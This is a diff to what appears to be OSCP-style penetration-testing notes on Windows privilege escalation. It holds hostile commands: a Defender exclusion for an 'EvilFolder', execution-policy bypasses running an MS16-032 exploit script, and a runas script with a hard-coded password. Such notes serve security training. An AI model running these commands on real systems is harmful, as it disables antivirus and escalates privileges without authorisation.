@@ -440,6 +440,7 @@ C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\To
 powershell
 $PSVersionTable
 $PSVersionTable.PSVersion
+powershell -ExecutionPolicy ByPass -command "& { . whoami }"
 ```
 * Download PowerUp
 	```
@@ -462,7 +463,7 @@ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-0
 ```
 * Powershell runas
 ```
-* [owershell RunAS](https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt)
+* [Powershell RunAS](https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt)
 
 echo $username = 'ftp' > runas.ps1
 echo $securePassword = ConvertTo-SecureString "foobar23" -AsPlainText -Force  >> runas.ps1
